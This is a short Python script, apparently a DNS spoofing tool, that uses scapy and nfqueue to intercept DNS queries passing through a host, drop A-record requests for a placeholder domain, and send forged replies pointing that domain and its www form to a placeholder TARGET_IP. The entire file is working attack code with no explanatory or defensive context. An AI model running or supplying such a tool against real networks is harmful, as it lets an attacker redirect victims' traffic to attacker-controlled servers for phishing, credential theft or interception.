#!/usr/bin/python
import nfqueue
import socket
from scapy.all import *

def modify_dns(pkt, qname):
    modified_ip = "TARGET_IP"
    qd = pkt[UDP].payload
    dns = DNS(id=qd.id, qr=1, qdcount=1, ancount=1, rcode=0)
    dns.qd = qd[DNSQR]
    dns.an = DNSRR(rrname=qname, ttl=5, rdlen=4, rdata=modified_ip)

    ip = IP()
    ip.src = pkt[IP].dst
    ip.dst = pkt[IP].src
    udp = UDP()
    udp.sport = pkt[UDP].dport
    udp.dport = pkt[UDP].sport
    send(ip/udp/dns, verbose=False)

def handle_dns(payload):
    pkt = IP(payload.get_data())
    UDP_HEX = 0x11

    if pkt.proto is UDP_HEX and pkt[UDP].dport is 53:
        dns = pkt[UDP].payload
        qname = dns[DNSQR].qname
        qtype = dns[DNSQR].qtype
        ARECORD = 1
        if qname == "MAIN_DOMAIN." or qname == "www.MAIN_DOMAIN." and qtype == ARECORD:
            payload.set_verdict(nfqueue.NF_DROP)
            modify_dns(pkt, qname)
            return
    payload.set_verdict(nfqueue.NF_ACCEPT)


q = nfqueue.queue()
q.open()
q.bind(socket.AF_INET)
q.set_callback(handle_dns)
q.create_queue(1)
q.try_run()
q.unbind(socket.AF_INET)
q.close()
